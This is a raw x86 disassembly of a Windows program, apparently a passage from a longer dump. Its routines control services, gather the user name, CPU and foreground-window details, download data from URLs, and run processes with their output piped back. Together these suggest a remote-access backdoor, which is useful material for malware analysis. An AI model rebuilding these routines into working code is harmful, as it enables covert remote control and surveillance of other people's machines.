call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x1d ]
lea ecx [ ebp - 0xc0 ]
push eax
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x120 ]
push [ ebx + 0xc ]
push eax
call sub_410ea5
pop ecx
pop ecx
push eax
lea eax [ ebp - 0xa0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x120 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xc0 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
and [ ebp - 0x1c ] 0x0
push 0x1
push [ ebx ]
push [ ebp - 0xc ]
call [ OpenServiceW@IAT ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x2c ] eax
push ecx
push 0x0
push edi
push eax
call [ QueryServiceConfigW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x40 ] eax
call [ malloc@IAT ]
mov edi eax
pop ecx
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x40 ]
push edi
push [ ebp - 0x2c ]
call [ QueryServiceConfigW@IAT ]
push esi
lea eax [ ebp - 0x70 ]
push [ edi ]
push eax
call sub_410ea5
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push esi
lea eax [ ebp - 0xb0 ]
push [ edi + 0x4 ]
push eax
call sub_410ea5
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x90 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x90 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xb0 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x15 ]
push r--data
push eax
push esi
lea ecx [ ebp - 0x110 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0xf0 ]
push [ edi + 0xc ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0xd0 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xf0 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x110 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push edi
call [ free@IAT ]
pop ecx
sub_4101b5
push ebp
mov ebp esp
push ebx
push esi
push edi
xor ebx ebx
push 0x10
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
push 0x10
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push ebx
push ebx
push edi
call [ StartServiceW@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
setne bl
call esi
push edi
call esi
push esi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
pop ebp
retn
sub_410215
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
xor ebx ebx
push 0x20
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
push 0x20
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push edi
call [ ControlService@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
setne bl
call esi
push edi
call esi
push esi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
leave
retn
sub_41027c
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
xor ebx ebx
push 0x11
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
push 0xf003f
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push edi
call [ ControlService@IAT ]
test eax eax
jne r-xdata
push esi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push edi
call [ QueryServiceStatus@IAT ]
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov bl 0x2
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
leave
retn
push ebx
push ebx
push edi
call [ StartServiceW@IAT ]
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
mov bl al
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
sub_41030e
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
xor ebx ebx
push 0x40
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
push 0x40
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x2
push edi
call [ ControlService@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
setne bl
call esi
push edi
call esi
push esi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
leave
retn
sub_410375
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
xor ebx ebx
push 0x40
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
push 0x40
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x3
push edi
call [ ControlService@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
setne bl
call esi
push edi
call esi
push esi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
leave
retn
sub_4103dc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor ebx ebx
push 0x2
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
push 0x2
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
movzx eax [ ebp + 0x18 ]
or ecx 0xffffffff
sub eax ebx
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
push 0x4
dec eax
je r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
mov al bl
pop esi
pop ebx
pop ebp
retn
push 0x2
jmp r-xdata
dec eax
jne r-xdata
pop ecx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0xffffffff
push ecx
push 0xffffffff
push edi
call [ ChangeServiceConfigW@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
setne bl
call esi
push edi
call esi
push 0x3
jmp r-xdata
sub_410498
push ebp
mov ebp esp
sub esp 0x50
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x2 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x18 ]
push r--data
push eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
lea eax [ ebp - 0x50 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_41055d
push ebp
mov ebp esp
sub esp 0x21c
lea eax [ ebp - 0x21c ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::npos@IAT ]
lea ecx [ ebp - 0x14 ]
push [ eax ]
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find_last_of@IAT ]
push eax
push 0x0
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::substr@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_4105c0
push ebp
mov ebp esp
sub esp 0x24c
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x10
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x1
call [ rw-data ]
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x100
push eax
lea eax [ ebp - 0x24c ]
push eax
call [ GetUserNameW@IAT ]
lea eax [ ebp - 0x24c ]
lea ecx [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
push [ ebp + 0x8 ]
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_410645
push ebp
mov ebp esp
sub esp 0x20
push 0x0
push r--data
lea eax [ ebp - 0x10 ]
push 0x80000000
push eax
call sub_40a4be
add esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
add eax 0x4
lea ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push 0x0
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
push r--data
sub esp 0x10
lea eax [ ebp - 0x10 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_411059
add esp 0x1c
lea ecx [ ebp - 0x10 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_4106ec
push ebp
mov ebp esp
sub esp 0x40
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] 0x40
push eax
call [ rw-data ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_410713
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
call sub_4106ec
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
leave
retn
sub_410732
push ebp
mov ebp esp
sub esp 0x58
or [ ebp - 0x18 ] 0xffffffff
push ebx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov esi 0x80000000
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_4107cb
mov edx [ ebp - 0x18 ]
pop ecx
pop ecx
xor eax eax
push 0x10
lea edi [ ebp - 0x58 ]
pop ecx
cmp edx esi
mov [ ebp - 0x8 ] edx
mov ebx esi
[ edi ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_4107cb
pop ecx
cmp ebx 0x80000002
pop ecx
jne r-xdata
cmp ebx 0x80000003
jne r-xdata
lea esi [ ebp - 0x18 ]
lea edi [ ebp - 0x58 ]
jmp r-xdata
cmp ebx 0x80000004
jne r-xdata
lea esi [ ebp - 0x18 ]
lea edi [ ebp - 0x48 ]
jmp r-xdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc ebx
cmp ebx [ ebp - 0x8 ]
jbe r-xdata
lea esi [ ebp - 0x18 ]
lea edi [ ebp - 0x38 ]
sub_4107cb
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
cpuid
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
pop esi
pop ebx
pop ebp
retn
sub_4107e9
push ebp
mov ebp esp
sub esp 0x30
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x6
mov esi r--data
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x0
movsb [ edi ] [ esi ]
call [ time@IAT ]
add eax [ rw-data ]
push eax
call [ srand@IAT ]
mov esi [ rand@IAT ]
inc [ rw-data ]
pop ecx
pop ecx
call esi
push 0x1f
cdq
pop ecx
idiv ecx
add dl 0x4
movzx eax dl
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
mov edi eax
call esi
push 0x1a
cdq
pop ecx
idiv ecx
lea ecx [ ebp - 0x14 ]
movzx eax dl
mov al [ ebp + eax - 0x30 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
dec edi
jne r-xdata
sub_41087e
push ebp
mov ebp esp
mov eax 0x271c
call sub_412450
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
and [ ebp + 0x13 ] 0x0
xor esi esi
push esi
push esi
push esi
push 0x1
mov [ eax ] esi
push r--data
mov [ ebx ] esi
call [ InternetOpenA@IAT ]
push esi
push 0x80000000
push esi
push esi
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push eax
call [ InternetOpenUrlA@IAT ]
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
push [ ebp - 0xc ]
mov esi [ InternetCloseHandle@IAT ]
call esi
push [ ebp - 0x4 ]
call esi
mov al [ ebp + 0x13 ]
pop esi
pop ebx
leave
retn
push edi
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] esi
mov eax [ ebx ]
add eax [ ebp + 0x10 ]
push eax
call ??2@YAPAXI@Z
mov ecx [ ebx ]
mov esi [ ebp + 0x8 ]
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ ebp - 0x8 ] eax
and ecx 0x3
push [ ebp + 0x8 ]
[ edi ] [ esi ]
mov edi [ ebx ]
mov ecx [ ebp + 0x10 ]
add edi eax
mov eax ecx
lea esi [ ebp - 0x271c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_412390
mov eax [ ebp - 0x8 ]
pop ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add [ ebx ] eax
pop ecx
xor esi esi
jmp r-xdata
cmp [ ebp + 0x10 ] esi
jbe r-xdata
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x271c ]
push 0x2710
push eax
push [ ebp - 0x4 ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
push [ ebx ]
call ??2@YAPAXI@Z
pop ecx
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edi eax
mov [ ecx ] eax
mov ecx [ ebx ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ ebp + 0x13 ] 0x1
pop edi
sub_41098b
push ebp
mov ebp esp
sub esp 0x204
call [ GetForegroundWindow@IAT ]
lea ecx [ ebp - 0x204 ]
push 0x200
push ecx
push eax
call [ GetWindowTextW@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x204 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_4109e7
push ebp
mov ebp esp
mov eax 0xc444
call sub_412450
push ebx
xor ebx ebx
test [ rw-data ] 0x1
push esi
push edi
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x3 ] bl
mov esi rw-data
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x1c ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x34 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp + 0xc ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
or [ rw-data ] 0x1
lea eax [ ebp - 0x1 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
call sub_41241a
pop ecx
lea eax [ ebp - 0x40 ]
push ebx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x40 ] 0xc
mov [ ebp - 0x38 ] 0x1
mov [ ebp - 0x3c ] ebx
call [ CreatePipe@IAT ]
push 0x11
xor eax eax
pop ecx
lea edi [ ebp - 0xf4 ]
[ edi ]
push 0xfffffff6
mov [ ebp - 0xf4 ] 0x44
mov [ ebp - 0xc8 ] 0x101
mov [ ebp - 0xc4 ] bx
call [ GetStdHandle@IAT ]
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xb4 ] eax
lea eax [ ebp - 0x50 ]
mov ecx esi
push eax
lea eax [ ebp - 0xf4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
push ebx
push 0x1
push ebx
push ebx
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
push 0x1f4
setne [ ebp - 0x1 ]
call [ Sleep@IAT ]
cmp [ ebp - 0x1 ] bl
je r-xdata
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ ebp - 0x2 ] 0x1
mov esi [ CloseHandle@IAT ]
lea eax [ ebp - 0x24 ]
push ebx
push eax
push ebx
push ebx
push ebx
push [ ebp - 0xc ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp - 0x24 ] ebx
jbe r-xdata
push 0x3e
push rw-data
push 0xa
lea eax [ ebp - 0x34 ]
push 0xd
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x80 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
